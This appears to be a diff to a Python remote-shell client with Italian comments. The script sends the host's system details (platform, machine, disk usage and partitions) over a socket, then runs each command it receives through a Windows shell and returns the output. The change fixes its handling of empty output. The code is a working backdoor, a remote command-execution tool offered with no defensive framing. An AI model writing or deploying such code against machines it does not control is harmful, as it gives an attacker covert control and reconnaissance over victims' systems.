@@ -1,6 +1,7 @@
 from socket import *
 import platform
 import os
+
 import psutil
 import subprocess
 
@@ -13,7 +14,7 @@ info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine
        + str(psutil.disk_usage('/').percent) + '%\n Disk File System:	' + str(psutil.disk_partitions())
 
 clientSocket.send(info.encode())                       #manda architettura
-ack = clientSocket.recv(1024).decode()                  #recv(1024) indica che riceviamo al massimo 1024 byte
+ack = clientSocket.recv(1024).decode()                 #recv(1024) indica che riceviamo al massimo 1024 byte
 command = ''
 while command != 'exit':
     command = clientSocket.recv(2048).decode()
@@ -42,9 +43,9 @@ while command != 'exit':
         cmd = "cd C:\Windows\System32 && "
         proc = subprocess.Popen(cmd+command, stdout=subprocess.PIPE, shell=True)
         out, err = proc.communicate()
-        if out == Null:  #AGGIUSTANI
-            out = 'comando inesistente'
-            clientSocket.send(out)
+        if out == b'':
+            notFound = "Command not found"
+            clientSocket.send(notFound.encode())
         else:
             clientSocket.send(out)
 
